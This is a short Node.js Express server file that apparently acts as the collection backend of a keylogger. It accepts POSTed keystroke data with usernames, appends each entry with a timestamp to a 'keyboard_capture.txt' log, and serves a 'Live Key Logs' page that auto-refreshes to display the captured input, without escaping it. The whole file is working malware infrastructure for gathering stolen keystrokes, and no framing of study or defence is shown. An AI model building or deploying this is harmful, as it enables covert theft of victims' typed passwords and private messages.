const fs = require("fs");
const express = require("express");

const app = express();
app.use(express.json());

const PORT = 8080;
const LOG_FILE = "keyboard_capture.txt";

/* View logs in browser */
app.get("/", (req, res) => {
    let data = "No logs yet.";

    try {
        data = fs.readFileSync("keyboard_capture.txt", "utf8");
    } catch {}

    res.send(`
        <html>
        <head>
            <title>Live Key Logs</title>
            <meta http-equiv="refresh" content="3">
            <style>
                body { font-family: monospace; white-space: pre-wrap; }
            </style>
        </head>
        <body>
            ${data}
        </body>
        </html>
    `);
});


/* Receive keystrokes */
app.post("/", (req, res) => {
    if (!req.body.keyboardData || !req.body.username) {
        return res.status(400).send("Invalid data");
    }

    const timestamp = new Date().toLocaleString();
    const entry = `\n[${timestamp}]=[User:${req.body.username}]\n${req.body.keyboardData}\n`;

    fs.appendFile(LOG_FILE, entry, err => {
        if (err) {
            console.error(err);
            return res.status(500).send("Server error");
        }
        res.send("OK");
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`View the live Data_Buffer over here  ==> http://127.0.0.1:8080 `);



});
